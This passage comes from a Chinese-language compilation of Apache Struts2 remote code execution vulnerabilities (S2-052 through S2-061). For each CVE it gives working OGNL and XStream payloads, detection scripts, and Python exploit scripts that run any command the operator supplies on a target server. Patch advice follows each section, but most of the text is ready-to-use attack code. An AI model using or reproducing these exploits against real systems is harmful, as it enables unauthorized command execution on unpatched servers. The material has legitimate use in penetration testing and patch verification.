    YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
    L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
    BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
    MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
    AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
    AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
    AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
    AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
    AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
    AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
    </byte-array>
                                <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
    dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
    EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
    aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
    YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
    bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
    bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
    AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
    AAoAAQACABYAEAAJ</byte-array>
                              </__bytecodes>
                              <__transletIndex>-1</__transletIndex>
                              <__indentNumber>0</__indentNumber>
                            </default>
                            <boolean>false</boolean>
                          </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                          <name>newTransformer</name>
                          <parameter-types/>
                        </method>
                        <name>foo</name>
                      </filter>
                      <next class="string">foo</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer/>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>"""

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Referer': str(url),
        'Content-Type': 'application/xml',
        'Accept': '*/*'
             }
    timeout = 8
    try:
        requests.post(url,data=payload_sleep_based_10seconds,headers=headers,verify=False,timeout=timeout,allow_redirects=False)
        result = False
    except Exception:
        result = True
    return(result)


if __name__ == '__main__':
    output = verify(sys.argv[1])
    if output == True:
        print("Vulnerable!")
    else:
        print("Not Affected.")
```
#### Python漏洞利用代码(无回显执行命令)
```php
import pkg_resources
import requests
import sys
import argparse
import shlex

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def url_check(url):
    if "://" not in url:
        url = "http://" + url
    if "orders" not in url:
        url = url + "/orders/3/edit"
    return url

def parse_cmd(cmd,type='string'):
    cmd = shlex.split(cmd)
    if type == 'string':
        cmd_str = '"' + '","'.join(cmd) + '"'
    elif type == 'xml':
        cmd_str = '<string>' + '</string><string>'.join(cmd) + '</string>'
    else:
        cmd_str = cmd
    return(cmd_str)

def exploit(url,cmd):
    url = url_check(url)
    payload = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        {cmd}
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>"""
    cmd = parse_cmd(cmd, type='xml')
    header = {"User-Agent":"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
          "Content-Type":"application/xml"}
    data = payload.format(cmd=cmd)
    html = requests.post(url,data=data,headers=header)
    print(html)

if __name__ == '__main__':
    exploit(url,cmd)
```


### 漏洞修复
**修复方法：**
更新更新更新~~~升级Struts到2.5.13最新版本
**临时修复：**
在不使用时删除StrutsREST插件，限制服务端扩展类型
在struts.xml配置文件中加入：
<constantname="struts.action.extension" value="xhtml,,json" />

------


## 0x015 Struts2-053远程代码执行漏洞(CVE-2017-12611)
### 漏洞简介
**当在Freemarker标签中使用表达式文本或强制表达式时，使用如下请求值可能会致使远程代码执行**
**<@s.hidden name="redirectUri" value=redirectUri /> **
**<@s.hidden name="redirectUri" value="${redirectUri}" />**
**这两种状况下，值属性都使用可写属性，都会受到Freemarker表达式影响。**


### 影响版本
**Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10**


### 利用过程
#### 漏洞利用代码
```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636601468840-37faac86-ecdf-44aa-999a-7d5f42ee63c7.png#crop=0&crop=0&crop=1&crop=1&height=892&id=Zs7Cl&margin=%5Bobject%20Object%5D&name=image.png&originHeight=892&originWidth=1917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=302591&status=done&style=none&title=&width=1917)
#### Python漏洞验证代码
```php
import requests
import sys
import random
if len(sys.argv) != 2:
    print("Usage：%s <target>" % sys.argv[0])
    sys.exit()
target = sys.argv[1]
if "://" not in target:
    target = "http://" + target
num1 = random.randint(1,10000)
num2 = random.randint(1,10000)
check_poc = "%25%7B{num1}%2B{num2}%7D"
url = target + "/?name=" + check_poc.format(num1=num1, num2=num2)
try:
    result = requests.get(url)
    if str(num1+num2) in result.text:
        print("Vulnerable!")
    else:
        print("Not Affected.")
except Exception as e:
    print(e)
    pass
```
#### Python漏洞利用代码
```php
import requests
import sys
import argparse
from urllib.parse import quote
import re

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def exploit(url,cmd):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm)))).(#cmd='" + str(cmd)  + " ').(#iswin=(@java.lang.System@getProperty"
    payload += "('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:"
    payload += "{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io."
    payload += "IOUtils@toString(#process.getInputStream()))}"
    url = url + "/index.action?name=" + quote(payload)
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = re.search(r"Your name:([\s\S]*)<hr/>",response.text)
            print(data.group(1))
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if "://" not in url:
        url = "http://" + url
    exploit(url,cmd)
```
### 漏洞修复
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
S2-053：A possible Remote Code Execution attack when using an unintentional expression in Freemarker tag instead of string literals
链接：[https://cwiki.apache.org/confluence/display/WW/S2-053](https://cwiki.apache.org/confluence/display/WW/S2-053)

------

## 0x016 Struts2-057远程代码执行漏洞 (CVE-2018-11776)
### 漏洞简介
**Apache Struts2 2.3.0 - 2.3.34、2.5.0 - 2.5.16版本在实现上存在远程代码执行漏洞，该漏洞可能在两种情况下被触发，第一，当没有为底层xml配置中定义的结果设置namepace 值，并且其上层动作集配置没有或只有通配符命名空间值，可能构成 RCE攻击。第二，当使用没有 value和动作集的url标签时，并且其上层动作集配置没有或只有通配符命名空间值，也可能构成 RCE 攻击。**


### 影响版本
**Apache Struts 2.3 – Struts 2.3.34**
**Apache Struts 2.5 – Struts 2.5.16**


### 利用过程
#### 漏洞利用代码
```php
${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```
#### Payload漏洞验证脚本
```php
import requests
import sys
import random

if len(sys.argv) != 2:
    print("[*]Usage：%s <target>" % sys.argv[0])
    sys.exit(0)
target = sys.argv[1]
num1 = random.randint(10000,10000)
num2 = random.randint(10000,10000)
check_poc = "%24%7BNUM1%2BNUM2%7D"
if "://" not in target:
    target = "http://" + target  + "/struts2-showcase/"
elif "struts2-showcase":
    target = target + "/struts2-showcase/"
url = target + check_poc.replace("NUM1",str(num1)).replace("NUM2",str(num2)) + "/actionChain1.action"
result = requests.get(url,allow_redirects=False).headers
if str(num1+num2) in result["Location"]:
    print("Vulnerable!")
else:
    print("Not Affected.")
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636600939531-67d81dfc-5a53-4794-8cd6-b639f467d03c.png#crop=0&crop=0&crop=1&crop=1&height=329&id=u56ef0c99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=1744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50164&status=done&style=none&title=&width=1744)
#### Python漏洞利用脚本
```php
import requests
import sys
import argparse
from urllib.parse import quote
import re
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

if len(sys.argv) <= 1:
    print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",dest="url",help="Check a single URL.",action='store')
parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute. (Default: id)", action='store')
args = parser.parse_args()
url = args.url if args.url else None
cmd = args.cmd if args.cmd else None

def exploit(url,cmd):
    payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context)."
    payload += "(#cr=#ct['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames()."
    payload += "clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime()."
    payload += "exec('" + str(cmd) + " ')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}"
    url = url + quote(payload) + "/actionChain1.action"
    try:
        response = requests.get(url,allow_redirects=False).headers
        data = re.compile("")
        print(response['Location'])
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if "://" not in url:
        url = "http://" + url
    elif "struts2-showcase" not in url:
        url = url + "/struts2-showcase/"
    exploit(url,cmd)
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636600831965-9797c887-d2e3-4d15-8b9a-8b48c2be88be.png#crop=0&crop=0&crop=1&crop=1&height=388&id=u89a7e2c3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=388&originWidth=1783&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95981&status=done&style=none&title=&width=1783)
#### 

### 漏洞修复

**官方修复方案**
**官方已在最新版本中修复了此漏洞，请用户尽快将Struts升级至官方修复版本，2.3.*的用户请升级至2.3.35；2.5.*的用户请升级至2.5.17。下载链接如下所示：**
**Struts2.3.35:**
**http://mirrors.hust.edu.cn/apache/struts/2.3.35/struts-2.3.35-all.zip**
**Struts2.5.17:**
**http://mirrors.hust.edu.cn/apache/struts/2.5.17/struts-2.5.17-all.zip**

------

## 0x017 Struts2-059远程代码执行(CVE-2019-0230)
### 漏洞简介
Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。
Apache Struts 2.0.0版本至2.5.20版本中存在代码执行漏洞。攻击者可借助特制的请求利用该漏洞执行代码。


### 影响版本
**Apache Struts 2.0.0~2.5.20版本**


### 利用过程
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636550772388-147eecc7-026a-45d2-b385-3fffd91ac714.png#crop=0&crop=0&crop=1&crop=1&height=268&id=u71ccbe6c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1376&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46476&status=done&style=none&title=&width=688)
#### 漏洞利用代码
```php
%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('ls%20-al').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636550785618-deadc4f3-27db-474b-8ed9-7ac87a8a9c78.png#crop=0&crop=0&crop=1&crop=1&height=319&id=u473d71d4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=637&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=149485&status=done&style=none&title=&width=754)
#### Python漏洞验证脚本
```php
import sys
import random
import requests
if len(sys.argv) != 2:
    print("[*]Usage：%s <target>" % sys.argv[0])
    sys.exit(0)
url = sys.argv[1]
if "://" not in url:
    url = "http://"
if "action" not in url:
    url = url + "/index.action"
random_string = ''.join(random.choice('123456789') for i in range(3))
data = {"skillName":random_string+random_string}
try:
    result = requests.post(url,data=data)
    if random_string+random_string in result.text and result.status_code==200:
        print(result.text)
        print("Vulnerable!")
    else:
        print("Not Affected.")
except Exception as e:
    print(e)
    pass
```
#### Python漏洞攻击脚本
```php
import sys
import requests

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def exploit(url,cmd):
    if "://" not in url:
        url = "http://" + url + "/index.action"

    payload = "skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess."
    payload += "allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess."
    payload += "acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess."
    payload += "acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()."
    payload += "getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util."
    payload += "Scanner(%23a.exec('" + str(cmd) + "').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s."
    payload += "hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d"
    header = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
              'Content-Type':'application/x-www-form-urlencoded'}

    try:
        response = requests.post(url,headers=header,data=payload,allow_redirects=False,verify=False)
        if response.status_code == 200:
            print(response.text)
    except Exception as e:
        print(e)
        pass

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[*]Usage：%s <target> <cmd>" % sys.argv[0])
        sys.exit(0)
    else:
        exploit(sys.argv[1],sys.argv[2])
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636550667810-8d23c73f-7e9a-4cf8-9b5a-0b54337677f1.png#crop=0&crop=0&crop=1&crop=1&height=143&id=uec7f3910&margin=%5Bobject%20Object%5D&name=image.png&originHeight=285&originWidth=1518&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39032&status=done&style=none&title=&width=759)
### 漏洞修复
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
[https://cwiki.apache.org/confluence/display/ww/s2-059](https://cwiki.apache.org/confluence/display/ww/s2-059)

------

## 0x018 Struts2-061远程代码执行(CVE-2020-17530)
### 漏洞简介
**Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。据官方描述，如果开发人员在解析％{…}等标签时强制使用OGNL evaluation，则某些标签的属性可能会执行double evaluation，从而可能使不受信任的用户输入导致远程代码执行等安全风险**
**​**

### 影响版本
Apache Struts 2.0.0 -  Apache Struts 2.5.25



### 利用过程
#### 漏洞利用代码
```php
POST /index.action HTTP/1.1
Host: 192.168.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 833

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636624370220-166f142d-a309-4ff3-a5f1-aee915c40e2b.png#clientId=u3d33328f-93e9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=268&id=uae0a719f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=135717&status=done&style=none&taskId=u7b9a78c8-4891-41fc-88ff-e6b21712471&title=&width=781)
#### Python漏洞验证脚本
#### Python漏洞利用脚本




### 漏洞修复
**1）避免不受信任的用户输入使用强制OGNL evaluation**
**2）升级到Struts 2.5.26及更高版本**

